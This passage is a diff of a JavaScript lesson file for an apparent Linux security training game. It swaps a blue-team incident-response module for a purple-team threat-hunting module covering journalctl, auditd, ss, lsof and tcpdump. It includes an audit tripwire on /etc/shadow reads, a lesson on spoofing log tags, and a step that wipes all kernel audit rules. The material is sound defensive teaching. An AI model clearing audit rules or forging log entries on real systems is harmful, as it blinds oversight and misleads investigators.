@@ -1,621 +1,569 @@
-// seventhmodule.js
-// Module 7: Advanced Defensive Ops (Blue Team) - 65 Lessons
+// eighthmodule.js
+// Module 8: Threat Hunting & Purple Team (65 Lessons)
 
-const module7_blueteam = {
-  name: "7. Advanced Defensive Ops (65 Lessons)",
+const module8_purpleteam = {
+  name: "8. Threat Hunting & Purple Team (65 Lessons)",
   lessons: [
-    // --- PHASE 1: INITIAL TRIAGE & USER AUDITING (1-15) ---
+    // --- PHASE 1: LOG INJECTION & SYSTEMD FORENSICS (1-15) ---
     {
-      title: "Active Users",
-      why: "Incident Response begins with triage. Are you currently sharing this server with an attacker? The <b>w</b> command queries the <code>/var/run/utmp</code> file to show all active TTY/PTY terminal sessions, revealing who is logged in and what command they are currently executing.",
-      text: "Type <code>w</code>",
-      objective: "Type w",
-      xp: 10,
-      check: (c) => c === "w",
-    },
-    {
-      title: "User Details",
-      why: "The <b>who</b> command parses the exact same utmp file, but strips out the CPU load and active command data. Blue Teamers often use this in automated bash scripts to quickly parse raw active IP addresses.",
-      text: "Type <code>who</code>",
-      objective: "Type who",
-      xp: 10,
-      check: (c) => c === "who",
-    },
-    {
-      title: "Login History",
-      why: "If the attacker is currently offline, you must check the historical logs. The <b>last</b> command reads the binary <code>/var/log/wtmp</code> file, translating the raw hex data into a readable chronological list of every successful SSH login and system reboot.",
-      text: "Type <code>last</code>",
-      objective: "Type last",
+      title: "Inject Test Log",
+      why: "In a Purple Team engagement, you actively simulate attacks to see if your defenses notice. The <b>logger</b> command sends a custom string directly into the kernel's syslog ring buffer, testing if the Security Information and Event Management (SIEM) system is actively parsing alerts.",
+      text: 'Type <code>logger "Purple Team Test"</code>',
+      objective: 'Type logger "Purple Team Test"',
       xp: 15,
-      check: (c) => c === "last",
+      check: (c, a) => c === "logger" && a.includes("Purple Team Test"),
     },
     {
-      title: "Limit History",
-      why: "During a high-stress incident, flooding your terminal with thousands of historical logins hides critical data. The <b>-n 5</b> flag slices the output, showing you only the 5 most recent logins to quickly identify the breach window.",
-      text: "Type <code>last -n 5</code>",
-      objective: "Use last -n 5",
-      xp: 20,
-      check: (c, a) => c === "last" && a.includes("-n") && a.includes("5"),
-    },
-    {
-      title: "Check Root User",
-      why: "Attackers often create hidden 'backdoor' accounts and assign them a User ID (UID) of 0, making them invisible root equivalents. Filtering the <code>/etc/passwd</code> file for 'root' exposes any rogue accounts sharing God-mode privileges.",
-      text: 'Type <code>grep "root" /etc/passwd</code>',
-      objective: "Grep for root in passwd",
-      xp: 25,
-      check: (c, a, o, raw) =>
-        raw.includes("grep") &&
-        raw.includes("root") &&
-        raw.includes("/etc/passwd"),
-    },
-    {
-      title: "Check Active Shells",
-      why: "Service accounts (like 'www-data' or 'mysql') should never be able to log in interactively. By grepping for <b>sh$</b>, you filter the user database to show ONLY accounts that have a valid bash or sh terminal assigned to them.",
-      text: 'Type <code>grep "sh$" /etc/passwd</code>',
-      objective: "Grep for active shells",
-      xp: 30,
-      check: (c, a, o, raw) =>
-        raw.includes("grep") &&
-        raw.includes("sh") &&
-        raw.includes("/etc/passwd"),
-    },
-    {
-      title: "Audit Failed Logins",
-      why: "Before an attacker breaches a system, they usually brute-force it. The <b>/var/log/auth.log</b> records all PAM (Pluggable Authentication Modules) events. Filtering for 'Failed' reveals the attacker's IP address and the usernames they targeted.",
-      text: 'Type <code>grep "Failed" /var/log/auth.log</code>',
-      objective: "Grep Failed from auth.log",
-      xp: 30,
-      check: (c, a, o, raw) =>
-        raw.includes("grep") &&
-        raw.includes("Failed") &&
-        raw.includes("/var/log/auth.log"),
-    },
-    {
-      title: "Tail Auth Log",
-      why: "If an active brute-force attack is happening *right now*, you can grab the bottom of the authentication log to see the incoming strikes in real-time.",
-      text: "Type <code>tail -n 10 /var/log/auth.log</code>",
-      objective: "Tail the auth.log",
-      xp: 20,
+      title: "Verify Injection",
+      why: "Read the bottom of the syslog to mathematically prove that the operating system captured and stored your simulated event.",
+      text: "Type <code>tail -n 2 /var/log/syslog</code>",
+      objective: "tail -n 2 /var/log/syslog",
+      xp: 15,
       check: (c, a) =>
         c === "tail" &&
         a.includes("-n") &&
-        a.includes("10") &&
-        a.includes("/var/log/auth.log"),
+        a.includes("2") &&
+        a.includes("/var/log/syslog"),
     },
     {
-      title: "Audit Accepted Logins",
-      why: "Finding out how the attacker got in is paramount. Filtering for 'Accepted' will show exactly which account the attacker successfully compromised and at what timestamp.",
-      text: 'Type <code>grep "Accepted" /var/log/auth.log</code>',
-      objective: "Grep Accepted from auth.log",
-      xp: 30,
-      check: (c, a, o, raw) =>
-        raw.includes("grep") &&
-        raw.includes("Accepted") &&
-        raw.includes("/var/log/auth.log"),
-    },
-    {
-      title: "Audit Sudo Usage",
-      why: "Once an attacker compromises a low-level account, they will try to escalate to root. Grepping the auth log for 'sudo' reveals exactly what commands the compromised user attempted to run with elevated privileges.",
-      text: 'Type <code>grep "sudo" /var/log/auth.log</code>',
-      objective: "Grep sudo from auth.log",
-      xp: 30,
-      check: (c, a, o, raw) =>
-        raw.includes("grep") &&
-        raw.includes("sudo") &&
-        raw.includes("/var/log/auth.log"),
-    },
-    {
-      title: "Check Sudoers File",
-      why: "The <b>/etc/sudoers</b> file controls who is allowed to run root commands. If an attacker successfully gains root access, they will often rewrite this file to give their low-level backdoor account permanent administrative rights.",
-      text: "Type <code>cat /etc/sudoers</code>",
-      objective: "Read /etc/sudoers",
+      title: "Tag Log Entry",
+      why: "Attackers often spoof their logs to blend in. The <b>-t</b> (Tag) flag allows you to inject a log that masquerades as an official service, simulating a crashed NGINX worker.",
+      text: 'Type <code>logger -t NGINX "Simulated Crash"</code>',
+      objective: "Use logger -t NGINX",
       xp: 20,
-      check: (c, a) => c === "cat" && a[0] === "/etc/sudoers",
+      check: (c, a) =>
+        c === "logger" && a.includes("-t") && a.includes("NGINX"),
     },
     {
-      title: "Find NOPASSWD",
-      why: "The most dangerous configuration in the sudoers file is 'NOPASSWD'. It allows a user to execute root commands without ever typing a password. Attackers inject this string to ensure they never lose access.",
-      text: 'Type <code>grep "NOPASSWD" /etc/sudoers</code>',
-      objective: "Grep for NOPASSWD",
+      title: "Grep Tagged Log",
+      why: "Verify that the syslog parser correctly assigned your custom tag to the event payload.",
+      text: 'Type <code>grep "NGINX" /var/log/syslog</code>',
+      objective: "Grep NGINX from syslog",
+      xp: 15,
+      check: (c, a) =>
+        c === "grep" && a.includes("NGINX") && a.includes("/var/log/syslog"),
+    },
+    {
+      title: "Journalctl Basics",
+      why: "Modern Linux distributions use <b>systemd-journald</b> instead of flat text files. It stores logs in a highly indexed binary format, making searches lightning fast. <b>journalctl</b> is the tool used to query this binary database.",
+      text: "Type <code>journalctl</code>",
+      objective: "Type journalctl",
+      xp: 15,
+      check: (c) => c === "journalctl",
+    },
+    {
+      title: "Journalctl Reverse",
+      why: "Because binary logs contain millions of events, reading top-to-bottom is useless. The <b>-r</b> (Reverse) flag flips the index, forcing the output to start with the newest events first.",
+      text: "Type <code>journalctl -r</code>",
+      objective: "Type journalctl -r",
+      xp: 20,
+      check: (c, a) => c === "journalctl" && a.includes("-r"),
+    },
+    {
+      title: "Journalctl Follow",
+      why: "The <b>-f</b> (Follow) flag polls the binary database file descriptor in real-time, live-streaming events to your terminal exactly like `tail -f` does for text files.",
+      text: "Type <code>journalctl -f</code>",
+      objective: "Type journalctl -f",
+      xp: 20,
+      check: (c, a) => c === "journalctl" && a.includes("-f"),
+    },
+    {
+      title: "Journalctl Kernel",
+      why: "If the server suffers a hardware failure or a kernel panic, application logs are useless. The <b>-k</b> flag filters the database to show ONLY the raw `dmesg` messages generated by the kernel itself.",
+      text: "Type <code>journalctl -k</code>",
+      objective: "Type journalctl -k",
+      xp: 20,
+      check: (c, a) => c === "journalctl" && a.includes("-k"),
+    },
+    {
+      title: "Journalctl Unit",
+      why: "The greatest advantage of the binary journal is service mapping. The <b>-u</b> flag filters the database to show only logs belonging to a specific systemd unit (like 'ssh'), completely isolating its activity.",
+      text: "Type <code>journalctl -u ssh</code>",
+      objective: "Type journalctl -u ssh",
       xp: 25,
-      check: (c, a, o, raw) =>
-        raw.includes("grep") &&
-        raw.includes("NOPASSWD") &&
-        raw.includes("/etc/sudoers"),
+      check: (c, a) =>
+        c === "journalctl" && a.includes("-u") && a.includes("ssh"),
     },
     {
-      title: "Check Home Directories",
-      why: "Look at the physical home folders. If you see a directory for a user that doesn't exist in the company directory, you have discovered an attacker's staging area.",
-      text: "Type <code>ls -la /home</code>",
-      objective: "List /home directory",
-      xp: 15,
-      check: (c, a) => c === "ls" && a.includes("-la") && a.includes("/home"),
+      title: "Journalctl Priority",
+      why: "Logs are tagged with priority levels (0=Emergency, 3=Error, 7=Debug). The <b>-p err</b> flag filters out all informational noise, highlighting only critical faults that require immediate IR intervention.",
+      text: "Type <code>journalctl -p err</code>",
+      objective: "Type journalctl -p err",
+      xp: 25,
+      check: (c, a) =>
+        c === "journalctl" && a.includes("-p") && a.includes("err"),
     },
     {
-      title: "Audit Bash History",
-      why: "If an attacker was careless, they didn't clear their RAM before logging out. Reading their <b>.bash_history</b> file acts as a step-by-step confession of exactly what malware they downloaded and what files they modified.",
-      text: "Type <code>cat ~/.bash_history</code>",
-      objective: "Read bash history",
+      title: "Journalctl Time Since",
+      why: "If you know an attack occurred at 2:00 PM, you can bound the database query. The <b>--since</b> flag instructs the parser to ignore all binary data written before the specified timestamp.",
+      text: 'Type <code>journalctl --since "10 min ago"</code>',
+      objective: "Use journalctl --since",
+      xp: 30,
+      check: (c, a) => c === "journalctl" && a.includes("--since"),
+    },
+    {
+      title: "Journalctl Time Until",
+      why: "Bounding the search space further speeds up forensics. <b>--until</b> sets the upper boundary of your time-based query.",
+      text: 'Type <code>journalctl --until "1 hour ago"</code>',
+      objective: "Use journalctl --until",
+      xp: 30,
+      check: (c, a) => c === "journalctl" && a.includes("--until"),
+    },
+    {
+      title: "Journalctl Lines",
+      why: "Just like text manipulation, the <b>-n</b> flag slices a specific number of records off the output, preventing your terminal from being flooded.",
+      text: "Type <code>journalctl -n 10</code>",
+      objective: "Use journalctl -n 10",
       xp: 20,
-      check: (c, a) => c === "cat" && a[0] === "~/.bash_history",
+      check: (c, a) =>
+        c === "journalctl" && a.includes("-n") && a.includes("10"),
     },
     {
-      title: "Create IR Log",
-      why: "In a real incident, you must maintain a strict Chain of Custody. Every piece of evidence must be documented. Create a master log file to track your findings.",
-      text: "Type <code>touch ir_log.txt</code>",
-      objective: "Create ir_log.txt",
-      xp: 15,
-      check: (c, a) => c === "touch" && a[0] === "ir_log.txt",
+      title: "Journalctl Disk Space",
+      why: "Binary logs grow rapidly. The <b>--disk-usage</b> flag tells you exactly how much hard drive space the systemd journal is currently consuming so you can adjust log rotation parameters.",
+      text: "Type <code>journalctl --disk-usage</code>",
+      objective: "Use journalctl --disk-usage",
+      xp: 20,
+      check: (c, a) => c === "journalctl" && a.includes("--disk-usage"),
+    },
+    {
+      title: "Log System State",
+      why: "During an incident, you must export binary data into flat text files so it can be analyzed by external forensic tools that don't understand the systemd format.",
+      text: "Type <code>journalctl -k -p err > kernel_errors.txt</code>",
+      objective: "Redirect to kernel_errors.txt",
+      xp: 30,
+      check: (c, a) =>
+        c === "journalctl" &&
+        a.includes("-k") &&
+        a.includes(">") &&
+        a.includes("kernel_errors.txt"),
     },
 
-    // --- PHASE 2: PROCESS & NETWORK FORENSICS (16-30) ---
+    // --- PHASE 2: KERNEL AUDITING (16-25) ---
     {
-      title: "Process Snapshot",
-      why: "Malware requires a running process to execute its payload. <b>ps aux</b> dumps the entire process table. You are looking for randomly named binaries (like './sdf89') or python scripts running in the background.",
-      text: "Type <code>ps aux</code>",
-      objective: "Type ps aux",
+      title: "Check Audit Status",
+      why: "The <b>Linux Audit Daemon (auditd)</b> is the ultimate Blue Team weapon. It hooks directly into kernel System Calls (syscalls). The <b>auditctl -s</b> command checks if this kernel-level tracking is actively engaged.",
+      text: "Type <code>auditctl -s</code>",
+      objective: "Type auditctl -s",
+      xp: 20,
+      check: (c, a) => c === "auditctl" && a.includes("-s"),
+    },
+    {
+      title: "List Audit Rules",
+      why: "The kernel won't track everything by default because it would cause massive CPU lag. You must check what specific rules (hooks) are currently loaded into memory.",
+      text: "Type <code>auditctl -l</code>",
+      objective: "Type auditctl -l",
+      xp: 20,
+      check: (c, a) => c === "auditctl" && a.includes("-l"),
+    },
+    {
+      title: "Watch File Execution",
+      why: "Create a rule to track execution. <b>-w</b> watches a file. <b>-p x</b> targets the execute permission. <b>-k</b> assigns a key (tag). Every time someone runs the 'ping' binary, the kernel will quietly log it.",
+      text: "Type <code>auditctl -w /usr/bin/ping -p x -k ping_exec</code>",
+      objective: "Watch /usr/bin/ping",
+      xp: 40,
+      check: (c, a) =>
+        c === "auditctl" && a.includes("-w") && a.includes("/usr/bin/ping"),
+    },
+    {
+      title: "Watch File Reads",
+      why: "Create an intrusion tripwire. By hooking the 'read' (<b>-p r</b>) syscall for the shadow password file, you guarantee that if an attacker attempts to steal password hashes, the kernel will generate a high-priority alert.",
+      text: "Type <code>auditctl -w /etc/shadow -p r -k shadow_read</code>",
+      objective: "Watch /etc/shadow",
+      xp: 40,
+      check: (c, a) =>
+        c === "auditctl" && a.includes("-w") && a.includes("/etc/shadow"),
+    },
+    {
+      title: "Verify New Rules",
+      why: "Check that the kernel accepted your custom syscall hooks and they are active in memory.",
+      text: "Type <code>auditctl -l</code>",
+      objective: "Type auditctl -l",
       xp: 15,
-      check: (c, a) => c === "ps" && a.includes("aux"),
+      check: (c, a) => c === "auditctl" && a.includes("-l"),
     },
     {
-      title: "Filter Root Processes",
-      why: "A backdoor running as 'www-data' is bad, but a backdoor running as 'root' is catastrophic. Filter the process table to isolate high-level daemons and kernel threads.",
-      text: "Type <code>ps aux | grep root</code>",
-      objective: "Grep root processes",
-      xp: 25,
-      check: (c, a, o, raw) =>
-        raw.includes("ps") && raw.includes("grep") && raw.includes("root"),
-    },
-    {
-      title: "Live Process Monitor",
-      why: "Cryptominers are a very common payload. They consume 100% of your CPU resources. Running <b>top -b -n 1</b> takes a batch-mode snapshot of the live resource consumption to catch aggressive malware.",
-      text: "Type <code>top -b -n 1</code>",
-      objective: "Run top in batch mode",
+      title: "Search Audit Logs",
+      why: "<b>ausearch</b> is the tool used to query the auditd logs. The <b>-m PATH</b> flag searches specifically for any file access violations the kernel intercepted.",
+      text: "Type <code>ausearch -m PATH</code>",
+      objective: "Type ausearch -m PATH",
       xp: 30,
-      check: (c, a) => c === "top" && a.includes("-b") && a.includes("-n"),
+      check: (c, a) =>
+        c === "ausearch" && a.includes("-m") && a.includes("PATH"),
     },
     {
-      title: "Htop Forensics",
-      why: "Htop allows you to view processes in a 'Tree' mode (showing parent-child relationships). If a web server process spawned a bash terminal process, that is mathematical proof of a Reverse Shell exploit.",
-      text: "Type <code>htop</code>",
-      objective: "Type htop",
-      xp: 15,
-      check: (c) => c === "htop",
+      title: "Search by Key",
+      why: "Instead of reading massive logs, use the tag you assigned earlier. <b>-k shadow_read</b> instantly pulls up every single incident where the shadow file was touched.",
+      text: "Type <code>ausearch -k shadow_read</code>",
+      objective: "Type ausearch -k shadow_read",
+      xp: 35,
+      check: (c, a) =>
+        c === "ausearch" && a.includes("-k") && a.includes("shadow_read"),
     },
     {
-      title: "Network Listeners",
-      why: "If an attacker installed a 'Bind Shell', they opened a hidden port on the server and are waiting to connect to it. <b>netstat -tuln</b> reveals all ports actively listening for inbound traffic.",
-      text: "Type <code>netstat -tuln</code>",
-      objective: "Type netstat -tuln",
+      title: "Search by Executable",
+      why: "Filter incidents by the binary that caused them. <b>-x bash</b> shows every single kernel audit event that was triggered by an interactive terminal shell.",
+      text: "Type <code>ausearch -x bash</code>",
+      objective: "Type ausearch -x bash",
+      xp: 35,
+      check: (c, a) =>
+        c === "ausearch" && a.includes("-x") && a.includes("bash"),
+    },
+    {
+      title: "Audit Report Executables",
+      why: "<b>aureport</b> generates high-level summaries of audit data. This command produces a neat table of the most frequently executed files on the entire operating system.",
+      text: "Type <code>aureport -x --summary</code>",
+      objective: "Type aureport -x --summary",
+      xp: 35,
+      check: (c, a) =>
+        c === "aureport" && a.includes("-x") && a.includes("--summary"),
+    },
+    {
+      title: "Clear Audit Rules",
+      why: "Audit rules are loaded into RAM. The <b>-D</b> flag forcefully deletes all custom rules from the kernel's memory space to restore baseline performance.",
+      text: "Type <code>auditctl -D</code>",
+      objective: "Type auditctl -D",
       xp: 25,
-      check: (c, a) => c === "netstat" && a.includes("-tuln"),
+      check: (c, a) => c === "auditctl" && a.includes("-D"),
+    },
+
+    // --- PHASE 3: ADVANCED SOCKETS & FILE DESCRIPTORS (26-40) ---
+    {
+      title: "Modern Sockets",
+      why: "The <b>ss</b> (Socket Statistics) command is the modern replacement for netstat. It pulls data directly from kernel space via the netlink interface, making it exponentially faster when parsing thousands of connections.",
+      text: "Type <code>ss -tuln</code>",
+      objective: "Type ss -tuln",
+      xp: 20,
+      check: (c, a) => c === "ss" && a.includes("-tuln"),
     },
     {
-      title: "Active Connections",
-      why: "If the attacker is using a 'Reverse Shell', the port won't be listening; it will show as an ESTABLISHED outbound connection. <b>netstat -antp</b> maps all active connections directly to their associated Process ID (PID).",
-      text: "Type <code>netstat -antp</code>",
-      objective: "Type netstat -antp",
-      xp: 30,
-      check: (c, a) => c === "netstat" && a.includes("-antp"),
-    },
-    {
-      title: "Socket Statistics",
-      why: "The modern, faster replacement for netstat. <b>ss -tulnp</b> talks directly to the kernel's network stack to dump the raw socket data. You are hunting for unrecognized ports.",
+      title: "Socket Processes",
+      why: "The <b>-p</b> flag maps the raw network socket directly to its owning Process Namespace, revealing exactly which executable binary is generating the traffic.",
       text: "Type <code>ss -tulnp</code>",
       objective: "Type ss -tulnp",
-      xp: 30,
+      xp: 25,
       check: (c, a) => c === "ss" && a.includes("-tulnp"),
     },
     {
-      title: "List Open Files (Network)",
-      why: "In Linux, everything is a file—including network sockets. The <b>lsof -i</b> command lists all open files that are currently bound to an internet socket, making it the ultimate tool for catching malware communicating over the network.",
-      text: "Type <code>lsof -i</code>",
-      objective: "Type lsof -i",
-      xp: 25,
-      check: (c, a) => c === "lsof" && a.includes("-i"),
+      title: "Socket Summary",
+      why: "The <b>-s</b> flag quickly aggregates socket totals, revealing at a glance if a server is being hit by a massive UDP flood or a TCP SYN attack.",
+      text: "Type <code>ss -s</code>",
+      objective: "Type ss -s",
+      xp: 20,
+      check: (c, a) => c === "ss" && a.includes("-s"),
     },
     {
-      title: "Lsof Specific Port",
-      why: "If you know port 80 is acting suspicious, you can pass the port directly to lsof to isolate exactly which binary on the hard drive is generating the traffic.",
+      title: "Filter Sockets by Port",
+      why: "<b>ss</b> allows advanced filtering. By defining logical arguments, you can tell the kernel to only return sockets where the Destination Port (dport) or Source Port (sport) equals 22.",
+      text: "Type <code>ss -at '( dport = :22 or sport = :22 )'</code>",
+      objective: "Filter ss for port 22",
+      xp: 40,
+      check: (c, a) => c === "ss" && a.includes("22"),
+    },
+    {
+      title: "List Open Files",
+      why: "In Linux, everything is a file. Network connections, hardware devices, and pipes are all treated as 'File Descriptors'. <b>lsof</b> (List Open Files) maps every active file descriptor on the entire machine.",
+      text: "Type <code>lsof</code>",
+      objective: "Type lsof",
+      xp: 15,
+      check: (c) => c === "lsof",
+    },
+    {
+      title: "LSOF by Port",
+      why: "Isolate network descriptors. Find out exactly what binary, user, and Process ID is holding port 80 open.",
       text: "Type <code>lsof -i :80</code>",
       objective: "Type lsof -i :80",
       xp: 30,
       check: (c, a) => c === "lsof" && a.includes("-i") && a.includes(":80"),
     },
     {
-      title: "Catch Reverse Shell Port",
-      why: "Port 4444 is the default port for Metasploit payloads. If lsof shows an ESTABLISHED connection on this port, your server is completely compromised.",
-      text: "Type <code>lsof -i :4444</code>",
-      objective: "Check port 4444",
+      title: "LSOF by Protocol",
+      why: "Filter the massive file descriptor list to only show active IPv4 network sockets.",
+      text: "Type <code>lsof -i 4</code>",
+      objective: "Type lsof -i 4",
       xp: 30,
-      check: (c, a) => c === "lsof" && a.includes("-i") && a.includes(":4444"),
+      check: (c, a) => c === "lsof" && a.includes("-i") && a.includes("4"),
     },
     {
-      title: "Log Suspicious Port",
-      why: "Document your finding in the IR log. The attacker is operating a C2 (Command and Control) connection on port 4444.",
-      text: 'Type <code>echo "Suspicious Port 4444" >> ir_log.txt</code>',
-      objective: "Log finding to ir_log.txt",
-      xp: 20,
-      check: (c, a, o, raw) =>
-        raw.includes("echo") &&
-        raw.includes("Port 4444") &&
-        raw.includes(">>") &&
-        raw.includes("ir_log.txt"),
-    },
-    {
-      title: "Inspect Malicious PID",
-      why: "Assuming lsof told us the malware is running on Process ID 1234, we use <b>ps -f -p 1234</b> to extract the exact command-line arguments the attacker used to launch the malware.",
-      text: "Type <code>ps -f -p 1234</code>",
-      objective: "Inspect PID 1234",
+      title: "LSOF by User",
+      why: "Isolate all file descriptors currently owned and locked by the root user account.",
+      text: "Type <code>lsof -u root</code>",
+      objective: "Type lsof -u root",
       xp: 30,
-      check: (c, a) =>
-        c === "ps" &&
-        a.includes("-f") &&
-        a.includes("-p") &&
-        a.includes("1234"),
+      check: (c, a) => c === "lsof" && a.includes("-u") && a.includes("root"),
     },
     {
-      title: "Procfs Forensics",
-      why: "The <b>/proc</b> directory is a virtual filesystem reflecting live kernel memory. Even if the attacker deleted their malware from the hard drive, the kernel still holds a symbolic link to the raw executable in memory at <code>/proc/[PID]/exe</code>.",
-      text: "Type <code>ls -l /proc/1234/exe</code>",
-      objective: "Check process executable path",
+      title: "LSOF by PID",
+      why: "If you find a suspicious Process ID (1337), you can interrogate its namespace to see every single file on the hard drive that it is actively reading or modifying.",
+      text: "Type <code>lsof -p 1337</code>",
+      objective: "Type lsof -p 1337",
+      xp: 30,
+      check: (c, a) => c === "lsof" && a.includes("-p") && a.includes("1337"),
+    },
+    {
+      title: "LSOF Network Connections",
+      why: "Advanced syntax allows you to combine conditions. This specifically filters for TCP connections that are in a fully ESTABLISHED stream state.",
+      text: "Type <code>lsof -iTCP -sTCP:ESTABLISHED</code>",
+      objective: "Use lsof to find ESTABLISHED tcp",
       xp: 40,
-      check: (c, a) =>
-        c === "ls" && a.includes("-l") && a.includes("/proc/1234/exe"),
+      check: (c, a) => c === "lsof" && a.includes("-iTCP"),
     },
     {
-      title: "Procfs Command Line",
-      why: "The <code>cmdline</code> file inside the procfs directory contains the exact strings passed to the binary when it was spawned. This reveals hidden flags or configuration files the malware is using.",
-      text: "Type <code>cat /proc/1234/cmdline</code>",
-      objective: "Read process command line",
-      xp: 30,
-      check: (c, a) => c === "cat" && a[0] === "/proc/1234/cmdline",
+      title: "Hunt Deleted Executables",
+      why: "Hackers delete their malware from the hard drive instantly. However, if the process is still running, the kernel keeps its inode alive in RAM. <b>+L1</b> finds file descriptors that have a link count of 0 (deleted from disk but alive in memory).",
+      text: "Type <code>lsof +L1</code>",
+      objective: "Type lsof +L1",
+      xp: 40,
+      check: (c, a) => c === "lsof" && a.includes("+L1"),
     },
     {
-      title: "Log Malicious PID",
-      why: "Document the exact Process ID of the malware so the rest of the incident response team knows what to kill during the eradication phase.",
-      text: 'Type <code>echo "Malware PID 1234" >> ir_log.txt</code>',
-      objective: "Log PID to ir_log.txt",
+      title: "Grep LSOF Log",
+      why: "Pipe lsof through grep to find out if any rogue processes currently have an active lock on the system password file.",
+      text: 'Type <code>lsof | grep "/etc/passwd"</code>',
+      objective: "Grep passwd from lsof",
+      xp: 25,
+      check: (c, a) => c === "lsof" || c === "grep",
+    },
+    {
+      title: "Kill Process from LSOF",
+      why: "You identified PID 1337 holding malicious file descriptors. Issue a SIGKILL to forcefully terminate the process and force the kernel to drop all its active file locks.",
+      text: "Type <code>kill -9 1337</code>",
+      objective: "Type kill -9 1337",
       xp: 20,
-      check: (c, a, o, raw) =>
-        raw.includes("echo") &&
-        raw.includes("PID 1234") &&
-        raw.includes(">>") &&
-        raw.includes("ir_log.txt"),
+      check: (c, a) => c === "kill" && a.includes("-9") && a.includes("1337"),
+    },
+    {
+      title: "Verify Kill via SS",
+      why: "Ensure the kernel fully reclaimed the port and the network socket is successfully closed.",
+      text: "Type <code>ss -tulnp | grep 1337</code>",
+      objective: "Grep 1337 from ss",
+      xp: 20,
+      check: (c, a) => c === "ss" || c === "grep",
+    },
+    {
+      title: "Log Socket State",
+      why: "The server is secure. Baseline the clean socket state so future forensic analysis has a known-good point of reference.",
+      text: "Type <code>ss -tulnp > clean_sockets.txt</code>",
+      objective: "Redirect ss to clean_sockets.txt",
+      xp: 25,
+      check: (c, a) =>
+        c === "ss" && a.includes(">") && a.includes("clean_sockets.txt"),
     },
 
-    // --- PHASE 3: HUNTING PERSISTENCE & CRON (31-45) ---
+    // --- PHASE 4: PACKET CAPTURE & ROOTKITS (41-55) ---
     {
-      title: "Audit System Crontab",
-      why: "If you kill the malware, the attacker will just lose access, right? Wrong. Attackers set up 'Persistence'. They inject commands into <b>/etc/crontab</b> to automatically re-download and re-execute the malware every 5 minutes.",
-      text: "Type <code>cat /etc/crontab</code>",
-      objective: "Read system crontab",
+      title: "Packet Sniffer",
+      why: "<b>tcpdump</b> captures raw network frames directly from the interface card using the libpcap library. It intercepts data before it even hits the application layer.",
+      text: "Type <code>tcpdump -c 5</code>",
+      objective: "Capture 5 packets",
       xp: 20,
-      check: (c, a) => c === "cat" && a[0] === "/etc/crontab",
+      check: (c, a) => c === "tcpdump" && a.includes("-c") && a.includes("5"),
     },
     {
-      title: "Audit Cron Drops",
-      why: "Linux has multiple drop-in folders for automation. Any script placed in <b>/etc/cron.d/</b> is executed automatically by the root kernel. Check here for hidden malicious bash scripts.",
-      text: "Type <code>ls -la /etc/cron.d</code>",
-      objective: "List /etc/cron.d",
-      xp: 20,
-      check: (c, a) =>
-        c === "ls" && a.includes("-la") && a.includes("/etc/cron.d"),
+      title: "Listen on Interface",
+      why: "The <b>-i lo</b> flag instructs tcpdump to bind specifically to the loopback interface, allowing you to sniff internal communications occurring entirely within the server itself.",
+      text: "Type <code>tcpdump -i lo -c 5</code>",
+      objective: "Capture on interface 'lo'",
+      xp: 25,
+      check: (c, a) => c === "tcpdump" && a.includes("-i") && a.includes("lo"),
     },
     {
-      title: "Audit Hourly Crons",
-      why: "Check the hourly execution directory. A common persistence trick is to drop a python reverse shell here, so even if the server is rebooted, the attacker regains access within the hour.",
-      text: "Type <code>ls -la /etc/cron.hourly</code>",
-      objective: "List /etc/cron.hourly",
-      xp: 20,
-      check: (c, a) =>
-        c === "ls" && a.includes("-la") && a.includes("/etc/cron.hourly"),
-    },
-    {
-      title: "Audit Daily Crons",
-      why: "Check the daily execution directory. Red Teamers often hide their deepest fallback backdoors here, hoping you won't check an automation script that only fires at 3:00 AM.",
-      text: "Type <code>ls -la /etc/cron.daily</code>",
-      objective: "List /etc/cron.daily",
-      xp: 20,
-      check: (c, a) =>
-        c === "ls" && a.includes("-la") && a.includes("/etc/cron.daily"),
-    },
-    {
-      title: "Audit User Crontab",
-      why: "Every individual user can also have their own hidden scheduled tasks. <b>crontab -l</b> reads the specific cron configuration for your currently logged-in user.",
-      text: "Type <code>crontab -l</code>",
-      objective: "List user crontab",
-      xp: 15,
-      check: (c, a) => c === "crontab" && a.includes("-l"),
-    },
-    {
-      title: "Audit SSH Authorized Keys",
-      why: "The <b>authorized_keys</b> file allows password-less login via public-key cryptography. Attackers append their own public key to the bottom of this file to guarantee permanent, highly-secure backdoor access to the machine.",
-      text: "Type <code>cat ~/.ssh/authorized_keys</code>",
-      objective: "Read SSH authorized keys",
+      title: "Sniff by Port",
+      why: "Applying a Berkeley Packet Filter (BPF). This tells tcpdump to drop all packets at the kernel level unless their source or destination port is exactly 80.",
+      text: "Type <code>tcpdump port 80 -c 5</code>",
+      objective: "Capture port 80",
       xp: 30,
-      check: (c, a) => c === "cat" && a[0] === "~/.ssh/authorized_keys",
-    },
-    {
-      title: "Audit Systemd Services",
-      why: "Advanced malware creates its own <b>systemd service</b> (e.g., 'network-helper.service') so that the Linux kernel physically manages and revives the malware if it crashes. List the core systemd configuration folder.",
-      text: "Type <code>ls -la /etc/systemd/system/</code>",
-      objective: "List systemd units",
-      xp: 25,
       check: (c, a) =>
-        c === "ls" && a.includes("-la") && a.includes("/etc/systemd/system/"),
+        c === "tcpdump" && a.includes("port") && a.includes("80"),
     },
     {
-      title: "Audit Enabled Services",
-      why: "Filter the massive systemctl list to show ONLY services that are configured to boot automatically when the server turns on. Look for services with misspelled or generic names.",
-      text: "Type <code>systemctl list-unit-files --state=enabled</code>",
-      objective: "List enabled systemd services",
-      xp: 35,
+      title: "Sniff by IP",
+      why: "Filter the packet capture based on the network layer IP header. This isolates all traffic flowing to or from a specific attacker's IP address.",
+      text: "Type <code>tcpdump host 10.0.0.99 -c 5</code>",
+      objective: "Capture host 10.0.0.99",
+      xp: 30,
       check: (c, a) =>
-        c === "systemctl" &&
-        a.includes("list-unit-files") &&
-        a.some((x) => x.includes("--state=enabled")),
+        c === "tcpdump" && a.includes("host") && a.includes("10.0.0.99"),
     },
     {
-      title: "Check SSH Service",
-      why: "If you found an attacker connecting via SSH, check the service status. If the attacker recompiled the SSH daemon (a rootkit), the logs might show strange memory signatures.",
-      text: "Type <code>systemctl status ssh</code>",
-      objective: "Check SSH status",
-      xp: 20,
-      check: (c, a) =>
-        c === "systemctl" && a.includes("status") && a.includes("ssh"),
-    },
-    {
-      title: "Check Cron Service",
-      why: "Verify the cron daemon itself is healthy and hasn't been hijacked by a kernel module.",
-      text: "Type <code>systemctl status cron</code>",
-      objective: "Check Cron status",
-      xp: 20,
-      check: (c, a) =>
-        c === "systemctl" && a.includes("status") && a.includes("cron"),
-    },
-    {
